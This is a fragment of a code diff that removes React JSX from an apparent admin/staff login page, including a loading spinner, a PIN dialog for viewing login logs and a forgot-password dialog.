-                      <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
-                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                      </svg>
-                      Authenticating...
-                    </>
-                  ) : (
-                    <>
-                      {loginType === 'admin' ? <Shield size={16} /> : <Users size={16} />}
-                      {loginType === 'admin' ? 'Admin Login' : 'Staff Login'}
                     </>
                   )}
-                </span>
-              </Button>
-            </CardFooter>
-          </form>
-        </Card>
-      </div>
-
-      <Dialog open={pinDialogOpen} onOpenChange={setPinDialogOpen}>
-        <DialogContent className="sm:max-w-md bg-background border-nerfturf-purple/40">
-          <DialogHeader>
-            <DialogTitle className="flex items-center gap-2">
-              <Lock size={16} className="text-nerfturf-purple" />
-              Enter PIN to Access Logs
-            </DialogTitle>
-            <DialogDescription>
-              Enter the security PIN to view login logs.
-            </DialogDescription>
-          </DialogHeader>
-          <div className="py-6">
-            <div className="space-y-2">
-              <label htmlFor="pinInput" className="text-sm font-medium">Security PIN</label>
-              <div className="relative">
-                <Input
-                  id="pinInput"
-                  type={showPin ? "text" : "password"}
-                  placeholder="Enter 4-digit PIN"
-                  value={pinInput}
-                  onChange={(e) => setPinInput(e.target.value)}
-                  onKeyDown={(e) => {
-                    if (e.key === 'Enter') {
-                      handlePinSubmit();
-                    }
-                  }}
-                  maxLength={4}
-                  className="bg-background/50 border-nerfturf-purple/30 pr-10 text-center text-2xl tracking-widest"
-                />
-                <button
-                  type="button"
-                  onClick={togglePinVisibility}
-                  className="absolute right-2 top-1/2 transform -translate-y-1/2 text-nerfturf-purple hover:text-nerfturf-magenta focus:outline-none"
-                  aria-label={showPin ? "Hide PIN" : "Show PIN"}
-                >
-                  {showPin ? <EyeOff size={18} /> : <Eye size={18} />}
-                </button>
-              </div>
-            </div>
-          </div>
-          <DialogFooter>
-            <Button variant="outline" onClick={() => setPinDialogOpen(false)}>Cancel</Button>
-            <Button 
-              onClick={handlePinSubmit}
-              disabled={pinInput.length !== 4}
-              className="bg-gradient-to-r from-nerfturf-purple to-nerfturf-magenta hover:from-nerfturf-purple hover:to-nerfturf-magenta"
-            >
-              Access Logs
-            </Button>
-          </DialogFooter>
-        </DialogContent>
-      </Dialog>
-
-      <Dialog open={forgotDialogOpen} onOpenChange={setForgotDialogOpen}>
-        <DialogContent className="sm:max-w-md bg-background border-nerfturf-purple/40">
-          {renderForgotPasswordContent()}
         </DialogContent>
       </Dialog>
     </div>
